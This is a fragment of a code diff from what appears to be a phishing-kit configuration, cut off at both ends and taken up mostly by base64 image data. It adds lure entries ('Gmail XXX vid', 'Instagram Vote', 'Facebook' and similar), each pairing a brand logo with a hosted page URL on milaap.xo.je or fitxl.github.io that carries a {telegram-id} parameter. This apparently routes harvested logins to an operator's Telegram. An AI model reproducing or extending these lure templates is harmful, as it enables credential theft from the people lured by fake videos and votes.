QEiEjPBkSEjNBgS4SNz2fanVtLV1HOFGnhKtUw9yD+Ff73g8Pu+R5OpurNfSdxCjSjnLOUmnuU6a41Jdlj920uZ9HUoWGruj25Pw6FvHenJ4OpXqvLh8U5PBJfRZJAWaw6Zs9XrFNRjGNOPh21vF4Sq1MMVHHj3cnjzeb4/O2ldK176vO5uJupVqvFvhGK5QiuUUskvzbbMmtus9fS91K5reys40aWOMaFLHKC6vm3zfZJLy4SAlQkZoMiwkZoSAlwkbDqbrFPRlzGssZUp4QrwXx08eKXzLivuubNZgzPCQH0HrVoSjpmy3YSg3KKrWtZZpTaxi8flkng+z7I4BWozozlSqRdOpTlKE4vjGSeDR0rZNrTuS/D60vZm27aT+GbzlR+jza74rmjZNb9ntDSddXCqu2qOKjVcYKaq4ZRk1isGlljzSXQDwNk2tOH/jq0uO9K2k395Ufza+66I8bb5qNvx/F7eHtQUY3kIrOUFlGvlzWSfbB8me/S2SqElKOkKkZQalGSopSjJPFST38mmjo0aG9T8Os41t6G5UbilCpisJYwzwTzy7gfEQN02qalS0JeOME3aXG9O1k8XhH4qTb+KLa+qafU0sAAAAAAAACcAAIUuJQrLiUAAAAAAKxZ7GirFzeL4EbRli6jxfBGxeJCjDFtRjFZsDZtAa219EUpqh4FNSalUnKmpTlhkljjwWeC7vqa7rdrre6YlDzE14dHF06cFuQ3n8clzlhl2WKXF467e6QlXl0gvdj+r7mKDAlwkZoMiwkZoSAlQkZ4SIkGZoSAlwkZoMiwkZoyAmUqji1JNxcWmmng01mmnyeJuMdp2lEsN+g8ObpRxffiaL4g8QDev7T9KfPb/wApf1H9p+lPnt/5S/qaL4h4ml9LcadN9pSX5IDYtfdot1pOl5OqrarCM4z31TSlCpHnB45PDFPs2aAAAAAAAAAABOAAEKXEoVlxKAAAAJVjauo+yMdtQc325s9iMo049EuYEpThSjyjGPFnhX99Ks+kV7sf1fctvLt1X0iuC/V9yMBlhIzQZFTM0JASoSM8JESEjNCQEuEjNBkWEjNGQEqMi7xCL4g8QCV4g8Qi+IeffX/wQf1f6IDLpPSXGEH2lJfkjyAAAAAAAAAAAAAnAACFLiUKy4lABfSpuTw9S2KxJMJKKAlQcaa6JEG4uHN9EuC/Utq1XL6GMAAABdFloAkwkZoMiQkZoyAlxkXeIRfEHiAS/EHiETxDDVr8kBmurv4Yv6v9CEAAAAAAAAAAAAAAATgABClxKFZcSgFylgUcsSgAAAAAAAAAqmV3y0AXb43y0AXORaAAAAAAAAAAAAAAAAABOAAEdgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUKgCUAAP/9k=", urlTemplate: "https://milaap.xo.je/sh/cv/cx.html?id={telegram-id}" },
-      { name: "Gmail Vote", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQ901eAwCHJkZ_K-vjQz9vX-WNgASX8gisXw&s", urlTemplate: "https://milaap.xo.je/sh/cv/cg.html?id={telegram-id}" },
-      { name: "Tiktok Vote", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2sZ4tDoHuXJBWzuZIkGQbWxLpV2gzx0TMDA&s", urlTemplate: "https://milaap.xo.je/sh/cv/ct.html?id={telegram-id}" },
-            { name: "Tiktok", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2sZ4tDoHuXJBWzuZIkGQbWxLpV2gzx0TMDA&s", urlTemplate: "https://milaap.xo.je/sh/t.html?id={telegram-id}" },
-      // The bellow should be premium
+      { name: "Twitter(X) XXX vid",image: "data:image/jpeg;base64,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", urlTemplate: "https://milaap.xo.je/sh/pf/px.html?id={telegram-id}" },
+      { name: "Gmail XXX vid",     image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQ901eAwCHJkZ_K-vjQz9vX-WNgASX8gisXw&s", urlTemplate: "https://milaap.xo.je/sh/pf/pg.html?id={telegram-id}" },
+      { name: "Tiktok XXX vid",    image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2sZ4tDoHuXJBWzuZIkGQbWxLpV2gzx0TMDA&s", urlTemplate: "https://milaap.xo.je/sh/pf/pt.html?id={telegram-id}" },
+      { name: "Facebook",          image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSevOG0v1ZHXdgks_lPReh0wXuMg1ALqR3wuz5rkPcgpyXq2Gepv9AVGmI&s=10", urlTemplate: "https://milaap.xo.je/sh/f.html?id={telegram-id}" },
+      { name: "Twitter(X)",        image: "data:image/jpeg;base64,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", urlTemplate: "https://fitxl.github.io/da/file/x.html?id={telegram-id}" },
+      { name: "Gmail",             image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQ901eAwCHJkZ_K-vjQz9vX-WNgASX8gisXw&s", urlTemplate: "https://milaap.xo.je/sh/g.html?id={telegram-id}" },
+      { name: "Facebook Vote",     image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSevOG0v1ZHXdgks_lPReh0wXuMg1ALqR3wuz5rkPcgpyXq2Gepv9AVGmI&s=10", urlTemplate: "https://milaap.xo.je/sh/cv/cf.html?id={telegram-id}" },
+      { name: "Instagram Vote",    image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQx9iCnoWNr47HoCH-oba-jF9imvwKUoq_DAPm7ohNBxQ&s=10", urlTemplate: "https://milaap.xo.je/sh/cv/ci.html?id={telegram-id}" },
+      { name: "Twitter(X) Vote",   image: "data:image/jpeg;base64,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